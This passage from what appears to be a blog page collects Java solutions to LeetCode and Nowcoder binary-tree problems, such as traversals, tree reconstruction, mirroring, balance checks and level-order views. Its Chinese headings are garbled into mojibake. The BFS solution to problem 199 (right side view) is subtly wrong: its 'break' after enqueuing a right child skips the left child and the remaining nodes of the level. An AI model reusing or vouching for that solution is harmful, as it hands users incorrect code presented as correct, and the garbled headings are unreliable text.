<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        Stack&lt;Pos&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack.push(<span class="keyword">new</span> <span class="title class_">Pos</span>(i, j));</span><br><span class="line">        board[i][j] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">            <span class="type">Pos</span> <span class="variable">current</span> <span class="operator">=</span> stack.peek();</span><br><span class="line">            <span class="keyword">if</span> (current.i - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; board[current.i - <span class="number">1</span>][current.j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="keyword">new</span> <span class="title class_">Pos</span>(current.i - <span class="number">1</span>, current.j));</span><br><span class="line">                board[current.i - <span class="number">1</span>][current.j] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (current.i + <span class="number">1</span> &lt; board.length &amp;&amp; board[current.i + <span class="number">1</span>][current.j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="keyword">new</span> <span class="title class_">Pos</span>(current.i + <span class="number">1</span>, current.j));</span><br><span class="line">                board[current.i + <span class="number">1</span>][current.j] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (current.j - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; board[current.i][current.j - <span class="number">1</span>] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="keyword">new</span> <span class="title class_">Pos</span>(current.i, current.j - <span class="number">1</span>));</span><br><span class="line">                board[current.i][current.j - <span class="number">1</span>] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (current.j + <span class="number">1</span> &lt;  board[<span class="number">0</span>].length &amp;&amp; board[current.i][current.j + <span class="number">1</span>] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="keyword">new</span> <span class="title class_">Pos</span>(current.i, current.j + <span class="number">1</span>));</span><br><span class="line">                board[current.i][current.j + <span class="number">1</span>] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            stack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="96-ä¸åŒçš„äºŒå‰æœç´¢æ ‘"><a href="#96-ä¸åŒçš„äºŒå‰æœç´¢æ ‘" class="headerlink" title="96. ä¸åŒçš„äºŒå‰æœç´¢æ ‘"></a><a href="https://leetcode-cn.com/problems/unique-binary-search-trees/">96. ä¸åŒçš„äºŒå‰æœç´¢æ ‘</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åŠ¨æ€è§„åˆ’</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numTrees</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt; n + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                dp[i] += dp[j]*dp[i - j - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="NC45-å®ç°äºŒå‰æ ‘çš„å…ˆåº-ä¸­åº-ååºéå†"><a href="#NC45-å®ç°äºŒå‰æ ‘çš„å…ˆåº-ä¸­åº-ååºéå†" class="headerlink" title="NC45 å®ç°äºŒå‰æ ‘çš„å…ˆåº,ä¸­åº,ååºéå†"></a><a href="https://www.nowcoder.com/practice/a9fec6c46a684ad5a3abd4e365a9d362?tpId=117&companyId=665&rp=1&ru=%252Fcompany%252Fhome%252Fcode%252F665&qru=%252Fta%252Fjob-code-high%252Fquestion-ranking&tab=answerKey">NC45 å®ç°äºŒå‰æ ‘çš„å…ˆåº,ä¸­åº,ååºéå†</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] threeOrders (TreeNode root) &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        ArrayList&lt;Integer&gt; pre = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        ArrayList&lt;Integer&gt; in = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        ArrayList&lt;Integer&gt; post = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        preOrder(root, pre);</span><br><span class="line">        inOrder(root, in);</span><br><span class="line">        postOrder(root, post);</span><br><span class="line">        <span class="type">int</span>[][] res = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>][pre.size()];</span><br><span class="line">        res[<span class="number">0</span>] = pre.stream().mapToInt(Integer::valueOf).toArray();</span><br><span class="line">        res[<span class="number">1</span>] = in.stream().mapToInt(Integer::valueOf).toArray();</span><br><span class="line">        res[<span class="number">2</span>] = post.stream().mapToInt(Integer::valueOf).toArray();</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">postOrder</span><span class="params">(TreeNode root, ArrayList&lt;Integer&gt; post)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        postOrder(root.left, post);</span><br><span class="line">        postOrder(root.right, post);</span><br><span class="line">        post.add(root.val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">inOrder</span><span class="params">(TreeNode root, ArrayList&lt;Integer&gt; in)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        inOrder(root.left, in);</span><br><span class="line">        in.add(root.val);</span><br><span class="line">        inOrder(root.right, in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">preOrder</span><span class="params">(TreeNode root, ArrayList&lt;Integer&gt; pre)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pre.add(root.val);</span><br><span class="line">        preOrder(root.left, pre);</span><br><span class="line">        preOrder(root.right, pre);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-07-é‡å»ºäºŒå‰æ ‘"><a href="#å‰‘æŒ‡-Offer-07-é‡å»ºäºŒå‰æ ‘" class="headerlink" title="å‰‘æŒ‡ Offer 07. é‡å»ºäºŒå‰æ ‘"></a><a href="https://leetcode-cn.com/problems/zhong-jian-er-cha-shu-lcof/">å‰‘æŒ‡ Offer 07. é‡å»ºäºŒå‰æ ‘</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    HashMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">int</span>[] preorder;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span>[] inorder)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.preorder = preorder;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; inorder.length; i++) &#123;</span><br><span class="line">            map.put(inorder[i],i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> recursive(<span class="number">0</span>, <span class="number">0</span> , inorder.length - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TreeNode <span class="title function_">recursive</span><span class="params">(<span class="type">int</span> pre_root_idx, <span class="type">int</span> in_left_idx, <span class="type">int</span> in_right_idx)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (in_left_idx &gt; in_right_idx) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(preorder[pre_root_idx]);</span><br><span class="line">        <span class="type">int</span> <span class="variable">idx</span> <span class="operator">=</span> map.get(preorder[pre_root_idx]);</span><br><span class="line">        root.left = recursive(pre_root_idx + <span class="number">1</span>, in_left_idx, idx - <span class="number">1</span>);</span><br><span class="line">        root.right = recursive(pre_root_idx + idx - in_left_idx + <span class="number">1</span>, idx + <span class="number">1</span>, in_right_idx);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-26-æ ‘çš„å­ç»“æ„"><a href="#å‰‘æŒ‡-Offer-26-æ ‘çš„å­ç»“æ„" class="headerlink" title="å‰‘æŒ‡ Offer 26. æ ‘çš„å­ç»“æ„"></a><a href="https://leetcode-cn.com/problems/shu-de-zi-jie-gou-lcof/">å‰‘æŒ‡ Offer 26. æ ‘çš„å­ç»“æ„</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªè¾…åŠ©å‡½æ•°åˆ¤æ–­ä¸¤æ£µæ ‘æ˜¯å¦ç›¸ç­‰2.é€’å½’éå†Aæ ‘çš„æ¯ä¸€ä¸ªèŠ‚ç‚¹ä½œä¸ºæ ¹ç»“ç‚¹å’ŒBæ ‘è¿›è¡Œæ¯”è¾ƒ</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSubStructure</span><span class="params">(TreeNode A, TreeNode B)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (A == <span class="literal">null</span> || B == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dfs(A, B) || isSubStructure(A.left, B) || isSubStructure(A.right, B);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(TreeNode a, TreeNode b)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (b == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a.val == b.val &amp;&amp; dfs(a.left, b.left) &amp;&amp; dfs(a.right, b.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-55-II-å¹³è¡¡äºŒå‰æ ‘"><a href="#å‰‘æŒ‡-Offer-55-II-å¹³è¡¡äºŒå‰æ ‘" class="headerlink" title="å‰‘æŒ‡ Offer 55 - II. å¹³è¡¡äºŒå‰æ ‘"></a><a href="https://leetcode-cn.com/problems/ping-heng-er-cha-shu-lcof/">å‰‘æŒ‡ Offer 55 - II. å¹³è¡¡äºŒå‰æ ‘</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isBalanced</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Math.abs(getHigh(root.left) - getHigh(root.right)) &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> isBalanced(root.left) &amp;&amp; isBalanced(root.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getHigh</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.max(getHigh(root.left), getHigh(root.right)) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-27-äºŒå‰æ ‘çš„é•œåƒ"><a href="#å‰‘æŒ‡-Offer-27-äºŒå‰æ ‘çš„é•œåƒ" class="headerlink" title="å‰‘æŒ‡ Offer 27. äºŒå‰æ ‘çš„é•œåƒ"></a><a href="https://leetcode-cn.com/problems/er-cha-shu-de-jing-xiang-lcof/">å‰‘æŒ‡ Offer 27. äºŒå‰æ ‘çš„é•œåƒ</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é€’å½’</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">mirrorTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> root.left;</span><br><span class="line">        root.left = mirrorTree(root.right);</span><br><span class="line">        root.right = mirrorTree(tmp);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// é˜Ÿåˆ—</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">mirrorTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">            <span class="keyword">if</span> (node.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                queue.add(node.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                queue.add(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> node.left;</span><br><span class="line">            node.left = node.right;</span><br><span class="line">            node.right = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="103-äºŒå‰æ ‘çš„é”¯é½¿å½¢å±‚åºéå†"><a href="#103-äºŒå‰æ ‘çš„é”¯é½¿å½¢å±‚åºéå†" class="headerlink" title="103. äºŒå‰æ ‘çš„é”¯é½¿å½¢å±‚åºéå†"></a><a href="https://leetcode-cn.com/problems/binary-tree-zigzag-level-order-traversal/">103. äºŒå‰æ ‘çš„é”¯é½¿å½¢å±‚åºéå†</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">zigzagLevelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                    list.add(node.val);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    list.add(<span class="number">0</span>, node.val);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (node.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.add(node.left);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.add(node.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            flag = !flag;</span><br><span class="line">            res.add(list);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="199-äºŒå‰æ ‘çš„å³è§†å›¾"><a href="#199-äºŒå‰æ ‘çš„å³è§†å›¾" class="headerlink" title=" 199. äºŒå‰æ ‘çš„å³è§†å›¾"></a><a href="https://leetcode-cn.com/problems/binary-tree-right-side-view"> 199. äºŒå‰æ ‘çš„å³è§†å›¾</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// BFS</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">rightSideView</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">                    res.add(node.val);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.add(node.right);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (node.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.add(node.left);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//dfs</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">rightSideView</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        dfs(root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(TreeNode root, <span class="type">int</span> depth)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (depth == res.size()) &#123;</span><br><span class="line">            res.add(root.val);</span><br><span class="line">        &#125;</span><br><span class="line">        depth++;</span><br><span class="line">        dfs(root.right, depth);</span><br><span class="line">        dfs(root.left, depth);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="105-ä»å‰åºä¸ä¸­åºéå†åºåˆ—æ„é€ "><a href="#105-ä»å‰åºä¸ä¸­åºéå†åºåˆ—æ„é€ " class="headerlink" title="105. ä»å‰åºä¸ä¸­åºéå†åºåˆ—æ„é€ "></a><a href="https://leetcode-cn.com/problems/construct-binary-tree-from-preorder-and-inorder-traversal">105. ä»å‰åºä¸ä¸­åºéå†åºåˆ—æ„é€ </a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é€’å½’</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    Map&lt;Integer, Integer&gt; inMap;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span>[] inorder)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> preorder.length;</span><br><span class="line">        inMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            inMap.put(inorder[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> myBuildTree(preorder, <span class="number">0</span>, n - <span class="number">1</span>, inorder, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TreeNode <span class="title function_">myBuildTree</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span> pre_left, <span class="type">int</span> pre_right, <span class="type">int</span>[] inorder, <span class="type">int</span> in_left, <span class="type">int</span> in_right)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (pre_left &gt; pre_right) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(preorder[pre_left]);</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> inMap.get(preorder[pre_left]);</span><br><span class="line">        root.left = myBuildTree(preorder, pre_left + <span class="number">1</span>, pre_left + index - in_left  , inorder, in_left, index - <span class="number">1</span>);</span><br><span class="line">        root.right = myBuildTree(preorder, pre_left + index - in_left+<span class="number">1</span>, pre_right, inorder, index + <span class="number">1</span>, in_right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="102-äºŒå‰æ ‘çš„å±‚åºéå†-x2F-x2F"><a href="#102-äºŒå‰æ ‘çš„å±‚åºéå†-x2F-x2F" class="headerlink" title="102. äºŒå‰æ ‘çš„å±‚åºéå†&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/binary-tree-level-order-traversal">102. äºŒå‰æ ‘çš„å±‚åºéå†</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                list.add(node.val);</span><br><span class="line">                <span class="keyword">if</span> (node.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.add(node.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.add(node.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            res.add(list);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

